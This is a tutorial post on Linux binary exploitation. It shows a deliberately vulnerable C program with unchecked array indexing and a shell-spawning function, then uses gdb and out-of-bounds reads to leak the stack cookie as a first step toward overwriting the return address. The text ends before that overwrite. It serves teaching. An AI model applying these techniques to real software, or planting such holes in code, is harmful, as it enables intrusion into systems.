# Introduction to Linux pwn - Overriding the return address

[Last time](https://github.com/yo-yo-yo-jbo/linux_pwn_intro) we described stack-smashing by overriding a variable, but this time we're going a bit more serious and overriding the return address.  
For that, I will introduce with another nice way of defeating stack cookies on the way. Let's jump right into it!

```c
#include <stdio.h>
#include <unistd.h>

#define LEN (10)

static
void
give_shell(void)
{
        printf("woot!\n");
        execve("/bin/sh", NULL, NULL);
}

static
void
storage()
{
        int arr[LEN] = { 0 };
        char menu_choice = 0;
        int index_choice = 0;

        setbuf(stdout, NULL);
        printf("Welcome to my awesome storage program!\n");

        // Handling menu forever
        for (;;)
        {
                // Getting the menu choice
                printf("Enter [R] to read, [W] to write or [Q] to quit: ");
                scanf(" %c", &menu_choice);

                // Handling quits
                if (menu_choice == 'Q')
                {
                        printf("Quitting.\n");
                        break;
                }

                // Handling wrong choices
                if ((menu_choice != 'R') && (menu_choice != 'W'))
                {
                        printf("Wrong choice.\n");
                        continue;
                }

                // Getting the index with a bounds check
                printf("Enter the array index: ");
                scanf("%d", &index_choice);

                // Handling reads
                if (menu_choice == 'R')
                {
                        printf("Value: %d\n", arr[index_choice]);
                        continue;
                }

                // Handling writes
                printf("Enter value: ");
                scanf("%d", arr+index_choice);
        }
}

int main()
{
        storage();
        return 0;
}
```

Well, let's analyze it!
- We have a "storage system" which is really just an array of 10 integers, where we can read and write freely.
- The index is never validated, which is very problematic - we can give either negative values or incides that are out-of-bounds!

This kind of condition is amazing for exploitation since we have two "primitives":
1. `read-what-where` - we can read from arbitrary addresses.
2. `write-what-where` - we can write arbitrary values to arbitrary addresses.

This will help us take control of the program!

## Exploitation
The first thing we have to do is bypass the stack cookie. Since we have an arbitrary read primitive, we can simply read that value!  
The stack cookie index can be found dynamically. Note that an integer is a 4-byte value, so we will need to leak the high and low parts of the QWORD that is the stack cookie.  
Let us use `gdb` to determine the index:

```shell
$ gdb ./chall
(gdb) b *storage
Breakpoint 1 at 0x11fc
(gdb) r
Breakpoint 1, 0x00005555555551fc in storage ()
```

Now we continue using `ni` until we hit:

```assembly
0x555555555228 <storage+12>     mov    rax,QWORD PTR fs:0x28
0x555555555231 <storage+21>     mov    QWORD PTR [rbp-0x8],rax
```

Showing the value or `rax` reveals the cookie (you will obviously get a different value):

```shell
(gdb) p/x $rax
$1 = 0xf5995ae751a8b000
```

That means we are expecting two integers - one with the value ` 0xf5995ae7` (i.e. `-174499097`) and one with the value `0x51a8b000` (i.e. `1370009600`):

```
Welcome to my awesome storage program!
Enter [R] to read, [W] to write or [Q] to quit: R
Enter the array index: 10
Value: 1370009600
Enter [R] to read, [W] to write or [Q] to quit: R
Enter the array index: 11
Value: -174499097
```

The indices could be determined statically also, but I find the dynamic approach easier.
